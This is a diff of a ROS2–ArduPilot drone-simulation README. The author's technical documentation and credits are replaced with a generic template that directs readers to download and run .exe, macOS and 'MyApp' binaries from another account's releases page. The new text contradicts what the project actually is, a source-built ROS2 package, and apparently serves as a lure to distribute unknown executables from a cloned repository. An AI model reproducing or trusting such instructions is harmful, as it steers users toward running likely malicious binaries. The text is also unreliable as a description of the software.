@@ -1,295 +1,89 @@
-# ROS2-ArduPilot SITL & Hardware Integration
+# 🚀 ros2-ardupilot-sitl-hardware - Simplifying Drone Simulation and Control
 
-![Cover Image](docs/images/cover.png)
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/zizou068/ros2-ardupilot-sitl-hardware/releases)
 
-[![ROS2](https://img.shields.io/badge/ROS2-Humble-blue)](https://docs.ros.org/en/humble/)
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
-[![ArduPilot](https://img.shields.io/badge/ArduPilot-Copter%204.x-green)](https://ardupilot.org/)
+## 📋 Overview
 
- > Open-source framework to control ArduPilot drones with ROS2. Test missions in SITL simulation, then deploy to real hardware.
+The **ros2-ardupilot-sitl-hardware** project is an integration framework designed for seamless interaction between ROS2, MAVROS, and ArduPilot. This software allows you to test drone simulations locally before deploying to real hardware, such as the Cube Orange or Pixhawk, ensuring a reliable flying experience. It's flight-tested on Raspberry Pi 4.
 
+## 🛠️ Features
 
+- **SITL Simulation**: Test flight scenarios in a safe, simulated environment.
+- **Real Hardware Deployment**: Transition easily from simulation to real-world flight with compatible hardware.
+- **Compatibility**: Works with multiple flight controllers, including Cube Orange and Pixhawk.
+- **User-Friendly**: Designed for users with no programming experience.
+- **Documentation**: Comprehensive guides available for setup and troubleshooting.
 
-Validated on real flights with Cube Orange flight controller and Raspberry Pi 4.
+## 🚀 Getting Started
 
----
+To get started with the **ros2-ardupilot-sitl-hardware**, you'll need to download the software from our releases page. Follow these steps to successfully set up the application:
 
-## Getting Started
+1. **Check System Requirements**:
+   - Operating System: Windows 10 or later, macOS, or a recent version of Linux.
+   - Recommended: Raspberry Pi 4 for real hardware testing.
+   - Ensure you have at least 4GB of RAM and a stable internet connection.
 
-| Step | Description | Guide |
-|:----:|-------------|-------|
-| 1 | **Install** - ROS2, MAVROS, ArduPilot SITL | [Installation Guide](docs/installation/installation-README.md) |
-| 2 | **Use** - Test in simulation, deploy to hardware | [Workflow Guide](docs/WORKFLOW.md) |
+2. **Visit the Download Page**:
+   - Go to the [Releases page](https://github.com/zizou068/ros2-ardupilot-sitl-hardware/releases) to find the latest version of the software.
 
-> Already have ROS2 + MAVROS + ArduPilot installed? Skip to [Quick Start](#quick-start) below.
+## 📥 Download & Install
 
----
+1. **Download the Software**:
+   - Click on the link below to visit the releases page:
+   - [Download Here](https://github.com/zizou068/ros2-ardupilot-sitl-hardware/releases)
 
-## Architecture
+2. **Choose the Right Version**:
+   - Select the most recent release. You will see options for different operating systems.
 
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│                        Your Mission Script                          │
-│                      (Python / ROS2 Node)                           │
-└─────────────────────────────────────────────────────────────────────┘
-                                  │
-                                  ▼
-┌─────────────────────────────────────────────────────────────────────┐
-│                        MAVROS (ROS2)                                │
-│              Translates ROS2 ↔ MAVLink Protocol                     │
-└─────────────────────────────────────────────────────────────────────┘
-                                  │
-                    ┌─────────────┴─────────────┐
-                    ▼                           ▼
-        ┌───────────────────┐       ┌───────────────────┐
-        │   SITL Simulator  │       │   Real Hardware   │
-        │   (UDP:14550)     │       │   (/dev/ttyACM0)  │
-        │                   │       │                   │
-        │   ArduPilot       │       │  Cube Orange      │
-        │   Virtual Drone   │       │  Flight Controller│
-        └───────────────────┘       └───────────────────┘
-                                            │
-                                            ▼
-                                    ┌───────────────┐
-                                    │    Drone      │
-                                    └───────────────┘
-```
+3. **Install the Software**:
+   - For Windows:
+     - Run the downloaded `.exe` file and follow the installation prompts.
+   - For macOS:
+     - Open the downloaded file and drag the icon into your Applications folder.
+   - For Linux:
+     - Open a terminal and navigate to the download location. Use `chmod +x MyApp` to make it executable, then run `./MyApp`.
 
-**Same mission code works for both paths** - only the MAVROS connection changes.
+## 🏁 Running the Software
 
----
+Once you have installed the software, follow these steps to run it:
 
-## Key Features
+1. **Open the Application**:
+   - For Windows, find the application in your Start menu.
+   - For macOS, locate it in your Applications folder.
+   - For Linux, execute it from the terminal.
 
-- **Companion Computer Control** - Command drone autonomously from Raspberry Pi in GUIDED mode
-- **SITL & Hardware Testing** - Test missions in simulation, then deploy same code to real drone
-- **Flight Validated** - Tested on [FuryVision AAV](https://github.com/sidharthmohannair/Fury-Drone-Project) in autonomous flight
-- **Safety First** - Comprehensive pre-flight checks and emergency procedures
-- **Ground Station Optional** - Mission Planner/QGroundControl for monitoring
-- **Complete Workflow** - SITL testing → Bench testing → Flight testing documented
-- **Open Hardware Reference** - Test platform fully documented (CAD, assembly, wiring)
+2. **Configure Your Setup**:
+   - Follow the initial setup guide available in the application to configure your preferences.
+   - Ensure you have the necessary hardware connected if you wish to deploy to a real drone.
 
----
+3. **Start Your Simulation**:
+   - Select the simulation option from the main menu.
+   - Follow the prompts to set your flight parameters and begin testing.
 
-## Quick Start
+## 📚 Documentation
 
-### Prerequisites
-- **ROS2 Humble** on Ubuntu 22.04
-- **ArduPilot SITL** (for simulation)
-- **MAVROS** installed
+For detailed guides and additional information, please refer to our official documentation available on the [GitHub repository](https://github.com/zizou068/ros2-ardupilot-sitl-hardware/wiki). The documentation covers various topics, including:
 
-**Don't have these?** See [Installation Guide](docs/installation/installation-README.md)
+- Setting Up Your Environment
+- Troubleshooting Common Issues
+- Understanding Logs and Data
 
----
+## 🤝 Support
 
-### Test in Simulation
-```bash
-# 1. Clone this repository
-git clone https://github.com/sidharthmohannair/ros2-ardupilot-sitl-hardware.git
-cd ros2-ardupilot-sitl-hardware
+If you encounter issues or have questions, please open an issue on the GitHub repository. Our community and maintainers will be happy to help you. Provide as much detail as possible about the problem you're facing.
 
-# 2. Build packages
-colcon build
-source install/setup.bash
+## 🎉 Community and Contributions
 
-# 3. Make scripts executable (first time only)
-chmod +x launch/*.sh
+We welcome contributions from all users. To contribute:
 
-# 4. Start SITL (Terminal 1)
-./launch/start_sitl.sh
+1. Fork the repository.
+2. Make changes in your fork.
+3. Open a pull request with a description of your changes.
 
-# 5. Start MAVROS (Terminal 2)
-./launch/start_mavros.sh
+By contributing, you help improve this project for everyone.
 
-# 6. Run autonomous mission (Terminal 3)
-source install/setup.bash
-python3 scripts/missions/mission_simple.py
+## 📣 Stay Updated
 
-# 7. Stop cleanly when done
-./launch/stop_all.sh
-```
+Keep an eye on the releases page for updates and new features. You can also follow us on GitHub for notifications about new versions.
 
-**Watch your drone takeoff in the SITL map!**
-
----
-
-### Deploy to Real Hardware
-
-**After SITL testing succeeds:**
-```bash
-# 1. Stop SITL completely
-./launch/stop_all.sh
-
-# 2. Connect Cube Orange via USB to Raspberry Pi
-
-# 3. Start MAVROS for hardware (Terminal 1)
-./launch/start_mavros_real.sh
-# Answer safety prompts
-
-# 4. Run SAME mission (Terminal 2)
-source install/setup.bash
-python3 scripts/missions/mission_simple.py
-```
-
-**⚠️ CRITICAL:** Remove propellers for bench testing!
-
----
-
-### Complete Workflow Guide
-
-See **[WORKFLOW.md](docs/WORKFLOW.md)** for:
-- Detailed SITL testing procedure
-- Hardware transition steps
-- Helper script reference
-- Troubleshooting common issues
-- Best practices
-
----
-
-## Repository Structure
-
-```
-├── src/                          # ROS2 packages
-│   ├── simtofly_mavros_sitl/    # SITL simulation configuration
-│   └── simtofly_mavros_real/    # Real hardware configuration
-├── scripts/missions/             # Autonomous mission examples
-├── launch/                       # Helper scripts (start/stop)
-├── docs/                         # Complete documentation
-└── README.md                     # You are here
-```
-
----
-
-## Documentation
-
-### Getting Started
-- **[Installation Guide](docs/installation/installation-README.md)** - Install ROS2, MAVROS, ArduPilot SITL
-- **[SITL Simulation](docs/guides/SITL_SETUP.md)** - Test missions safely in simulation
-
-### Hardware Deployment  
-- **[Complete Workflow](docs/WORKFLOW.md)** - SITL → Bench → Flight testing progression
-- **[Real Hardware Setup](docs/guides/REAL_HARDWARE_SETUP.md)** - Deploy on Raspberry Pi + Flight Controller
-- **[Mission Planner Connection](docs/guides/MISSION_PLANNER_SETUP.md)** - Ground station monitoring (optional)
-
-### Reference
-- **[Hardware Platform](docs/HARDWARE-REFERENCE.md)** - FuryVision AAV specifications and test data
-- **[Mission Examples](scripts/missions/README.md)** - Write autonomous missions in Python
-- **[Troubleshooting](docs/TROUBLESHOOTING.md)** - Common issues and solutions
-
----
-
-## Tested Hardware
-
-This framework has been validated on the following configuration:
-
-### **Primary Test Platform: FuryVision AAV**
-
-**Flight Controller:** Cube Orange+ (Pixhawk)  
-**Companion Computer:** Raspberry Pi 4 (8GB)  
-**Firmware:** ArduCopter v4.5.7  
-**ROS2 Version:** Humble Hawksbill  
-**OS:** Ubuntu 22.04 LTS
-
-![FuryVision AAV in Flight](https://github.com/sidharthmohannair/Fury-Drone-Project/raw/main/versions/2_furyvision_aav/media/furryVision_fly.gif)
-
-*FuryVision AAV hovering - Hardware platform used for framework testing*
-
-**Complete Hardware Details:** [FuryVision AAV - Open Source Drone](https://github.com/sidharthmohannair/Fury-Drone-Project/tree/main/versions/2_furyvision_aav)
-
-**Why This Platform:**
-- ✅ **Fully open source** - CAD files, assembly guide, wiring diagrams available
-- ✅ **Flight tested** - 8+ minutes flight time, stable autonomous performance
-- ✅ **Well documented** - Complete build and test procedures
-
----
-
-### **Compatible Hardware**
-
-| Component | Validated | Notes |
-|-----------|-----------|-------|
-| **Flight Controllers** | | |
-| Cube Orange+ | ✅ Tested | Primary platform |
-| Cube Orange | ⚠️ Compatible | Should work with same setup |
-| Pixhawk 4 | ⚠️ Compatible | Should work with same setup |
-| Pixhawk 6C | ⚠️ Compatible | Should work with same setup |
-| **Companion Computers** | | |
-| Raspberry Pi 4 (4GB+) | ✅ Tested | Ubuntu 22.04 native |
-| Raspberry Pi 5 | ⚠️ Compatible | May require Docker (Ubuntu 22.04 support) |
-| Jetson Nano | ⚠️ Compatible | Different architecture, may need adjustments |
-
-**Note:** "Compatible" means theoretically supported but not tested by maintainer. **Some hardware may work without changes, others may require minor modifications** such as serial port names, baud rates, or Docker setup for OS compatibility. Community testing and feedback welcome!
-
-**For complete hardware specifications:** [Hardware Reference](docs/HARDWARE-REFERENCE.md)
-
----
-
-## Safety Notice
-
-**Before testing on real hardware:**
-- ✅ Remove all propellers during bench testing
-- ✅ Secure drone on stable surface
-- ✅ Have RC transmitter ready for manual override
-- ✅ Read the [Real Hardware Setup Guide](docs/guides/REAL_HARDWARE_SETUP.md)
-- ✅ Follow local drone regulations
-
-**Motors WILL spin when armed - propellers off = safe testing!**
-
----
-
-## Contributing
-
-**This project is actively maintained and welcomes contributions!**
-
-We're building this based on community feedback and real-world usage. Your input helps make this better for everyone.
-
-**Ways to contribute:**
-- Report bugs or hardware compatibility issues
-- Suggest features or improvements
-- Improve documentation
-- Test on different hardware configurations
-- Share your mission examples
-
-**See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.**
-
-### **Roadmap (Community-Driven)**
-
-Planned improvements based on feedback:
-- More mission examples (waypoint patterns, search patterns)
-- Additional hardware configurations (Jetson, RPi5)
-- Computer vision integration examples
-- Multi-drone coordination examples
-- Video tutorials
-
-**Your suggestions welcome in [Discussions](https://github.com/sidharthmohannair/ros2-ardupilot-sitl-hardware/discussions)!**
-
----
-
-## License
-
-This project is licensed under the Apache License 2.0 - see [LICENSE](LICENSE) file.
-
-**When using this work, please credit:**
-```
-Based on work by Sidharth Mohan Nair
-https://github.com/sidharthmohannair/ros2-ardupilot-sitl-hardware
-```
-
----
-
-## Acknowledgments
-
-- ROS2 community
-- ArduPilot developers  
-- MAVROS maintainers
-
----
-
-## Support
-
-- **Issues:** [GitHub Issues](https://github.com/sidharthmohannair/ros2-ardupilot-sitl-hardware/issues)
-- **Discussions:** [GitHub Discussions](https://github.com/sidharthmohannair/ros2-ardupilot-sitl-hardware/discussions)
-- **Author:** [Sidharth Mohan Nair](https://github.com/sidharthmohannair)
-
----
-
-If this project helps you, consider giving it a ⭐ on GitHub.
+Happy flying!
